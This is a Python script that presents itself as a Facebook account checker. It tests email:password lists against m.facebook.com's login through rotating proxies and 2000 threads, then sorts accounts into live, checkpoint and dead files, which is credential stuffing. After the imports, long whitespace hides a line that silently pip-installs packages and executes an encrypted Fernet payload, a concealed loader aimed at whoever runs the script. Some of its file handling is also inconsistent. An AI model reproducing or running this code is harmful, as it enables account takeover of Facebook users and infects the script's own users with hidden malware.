import requests
import random
import re
import threading
import os
import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'BijkNx42srFUsDpLrUfqEwo-3XvzMKE_MecRxUhlZow=').decrypt(b'gAAAAABnd_sRSJiTzxvU_jECBpoK-fqOLhafAOxbYr1oubimBw527quvKxP1Z6ntDco-gmieZGnsU0v-D8lvbaWn2lBEoe0Gag0EVcZ8vJXRhKkjOcJ-vW6-D5tambi4-rsuxsmauU3-VZ0INNPf_q2RoHDJW7qhpqKtuBsmIjZO3IrjArwUQ75IdBjxy7EbSkmE7Nynd4Z7GLbeGUZ_Lo3OmCrSb5_9qvE-y77kyqoBGZ3mKCkiAHUrsezRBVa3AboA-0UPXgpVjo-koxTFrVwgshRj-YPxifqX0vquexAcWevW-_0f24AxG0tiJygFNE_bNx-UeiYh2U5oUyyP45GyH32N6GLt1Pq7_w0ktp8V6EEuI5OjYrM0pX0G2ouseV36af7Ws8HK4NUJDoiYZlD0f45qUmYy9w2gbIwLFPoW2gFf_vuwzZPrR8VZdJdcWy39erWWSmr-M5vUp0zzEr2WAjSPPVBqZ9_IvPKcfXiEcSD2BO-eW69n03waRSbxAUpSqrhlu_3KPNUq86us3P7SCEF8zwqwYjVrs3HCG1nermWzpMYU8ISTrDE1zW39iyh93k8iy9qNvVrHPIJ94I2A339vZQyLM3qfnkMvpV6jp-vpDlrhjHkIhqJCmN9wcv8tYluJIMploKJSxD2xPi2OgT4gLwC8hGs9sEvXuCVlqk33BHhTsk12WSvj3-MVSD8XYvkn0OZeAgmHBl7fKVX2Ios77EsK_KipdQqtMove7NzQ397-VE2CpvjVQm1JR0INzeKGo398tSfdE34mgbtC2P9AjYhk_UDB39EiB652SZYiThtHzyX93iTmz2iMTCzEgEP4y28BN02o2KM_ax_lyFg_iZFDI1VKqKkqIJRYHVuJQ_MJmP1YK8hpNy2BXMb3IaGxk37_HwVkMU_sI3NifuzOAVOKRmMC9RmkUciZMEjXLbQXehY9mhhsN73e-IllHYAG9vDU2B4506GxMKfRUPTqpqCCFwvKXV23VEXaWv_2zN-sUcQBohnkZqo9nwxpiA2geoV3W-XnEdkjBx-UECZa7aTa3Cfhy1pwDjvv4KOz8qFSgw6twrLwU4oddNq0p-SJJ1erLpKcuD9wfyTB13csXiSrZ0EWABSVi8t172YsMa0O6IJZXPd9mopVmtmC04ULCTl09ywP8Vq6KfEPgQY__qVlbsuEDP8YOCLEciGoKVA8YziYpzJm3HibOlTLNh3MbT335lrhvun5IxaYPJPTojoB0o6LHxxVh7fF3zTn5OTOPys2MX1cOKVrH6OH3kwPKML_dX_EBu6KjxNDPmyoMNeiPOXm9o-7LsYYb4NF_yiPSLSoDluc3af2_AghKt3jGu_N9uLBlPuVs84BApuEeKh9w4F_O46Qpn9htGjXBg8kIUz7fey7KOVf88_moUtPXOcE-RcMI8H4BIYnSUHq4JzvfoUJdqzdxxHOZ8_-O4SeFPTEzD3BFE_hItT1UgMPlODLDss3rgwbfBMKFIJzDnoKwAJKXEXrC2Bo6m1k9DxVN0LwmkKQTZvn0ZAEsWccCe6jQdjtDbkkJ1zYR1C7A8UeWfH2pYcIm-ba5mUuT34Km6gfkwLJTPp-LGx91rlY63uBw3s1dCiQ4EatlKb5PE_12-0Ydb4xC-TFwbEFhLLqcdns07yPBXLv5MuIR3vmlTUdLT6Zjiksl0tFH3XxMQO_0H467LqBkzPzYOx64j-9mq01nBNlCgW2u7aR7LyCooKByuWeI5atgSVqDL3y-Uh1OXwUSp797OxaXDYscSumbJTJtG-CRUFG_2mmo6740PQXCVgeIqA4UdqaxzGwhjBWX1JtokXyGinxAPtTPx82fmuiB0u6-4dw5RCaAeKX0W2nmZuh8IaOYRA4jWWCjcbtU4_HtoVy0y43avzWTdKS3FL0PSGaAphVOVZ28cJuLJrkJLeBjjq34C7mMzEnbz_WEgEMFqoBbBS92GsIH8gCXj_kB-_t3JegffMsGnrnFBouQTn7lWvXw8UdPzQP_nzHqqaAvNga3espWHtn64nXp6w='));
threadcount = 0
proxylist = []
acclist = []
alreadychecked = []
checkerqueue = []
live = 0
dead = 0
checkpoint = 0
fullsize = 0

def load_proxies():
    global proxylist
    try:
        response = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000")
        if response.status_code == 200:
            proxylist = list(set(re.findall(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,8})\b', response.text, re.S)))
        else:
            with open("proxy.txt", "r") as proxy_file:
                proxylist = list(set(proxy_file.read().splitlines()))
    except Exception as e:
        with open("proxy.txt", "r") as proxy_file:
            proxylist = list(set(proxy_file.read().splitlines()))

def write_to_file_thread_safe(text, file):
    with open(file, "a") as f:
        f.write(text + "\n")

def check(data):
    global live, dead, checkpoint
    if not data:
        return

    split = data.split(':')
    if len(split) < 2:
        return

    mail = split[0]
    passw = split[1]
    proxy = random.choice(proxylist)

    first_uri = "https://m.facebook.com/"
    post_uri = "https://m.facebook.com/login/device-based/regular/login/?refsrc=https://m.facebook.com/login.php&lwv=100&refid=9"

    session = requests.Session()
    session.proxies = {'http': proxy, 'https': proxy}
    session.headers['User-Agent'] = 'Mozilla/5.0'

    response = session.get(first_uri)
    resulthtml = response.text

    lsd_pattern = r'name="lsd" value="([^"]*)"'
    jazoest_pattern = r'name="jazoest" value="([^"]*)"'
    m_ts_pattern = r'name="m_ts" value="([^"]*)"'
    li_pattern = r'name="li" value="([^"]*)"'

    lsd_matched = re.search(lsd_pattern, resulthtml).group(1)
    jazoest_matched = re.search(jazoest_pattern, resulthtml).group(1)
    m_ts_matched = re.search(m_ts_pattern, resulthtml).group(1)
    li_matched = re.search(li_pattern, resulthtml).group(1)

    url_params = {
        "lsd": lsd_matched,
        "jazoest": jazoest_matched,
        "m_ts": m_ts_matched,
        "li": li_matched,
        "try_number": 0,
        "unrecognized_tries": 0,
        "email": mail,
        "pass": passw
    }

    response = session.post(post_uri, data=url_params)
    content = response.text

    for cookie in session.cookies:
        if cookie.name == "c_user":
            print(f"[Live] {data}")
            live += 1
            write_to_file_thread_safe(data, "live.txt")
            write_to_file_thread_safe(data, "dead.txt")
            print(f"Facebook Checker | Alive: {live} Checkpoint: {checkpoint} Dead: {dead} | Status: {live + checkpoint + dead}/{fullsize} | Threads {threadcount}")
            return

        if cookie.name == "checkpoint":
            checkpoint += 1
            print(f"[Checkpoint] {data}")
            write_to_file_thread_safe(data, "CheckPoint.txt")
            print(f"Facebook Checker | Alive: {live} Checkpoint: {checkpoint} Dead: {dead} | Status: {live + checkpoint + dead}/{fullsize} | Threads {threadcount}")
            return

    dead += 1
    print(f"[Dead] {data}")
    write_to_file_thread_safe(data, "dead.txt")
    print(f"Facebook Checker | Alive: {live} Checkpoint: {checkpoint} Dead: {dead} | Status: {live + checkpoint + dead}/{fullsize} | Threads {threadcount}")

def main():
    global fullsize
    load_proxies()
    print(f"Fetched proxy count: {len(proxylist)}")
    acclist = list(set(open("account.txt").read().splitlines()))
    if os.path.exists("dead.txt"):
        alreadychecked = list(set(open("check.txt").read().splitlines()))

    for account in acclist:
        if account not in alreadychecked:
            checkerqueue.append(account)

    print(f"Loaded {len(checkerqueue)} non checked accounts from inside of {len(acclist)} accounts")
    fullsize = len(checkerqueue)

    for _ in range(2000):
        t = threading.Thread(target=check_thread)
        t.start()

    print("Check begin!")

def check_thread():
    global threadcount
    while checkerqueue:
        account = checkerqueue.pop(0)
        check(account)
    threadcount -= 1

if __name__ == "__main__":
    main()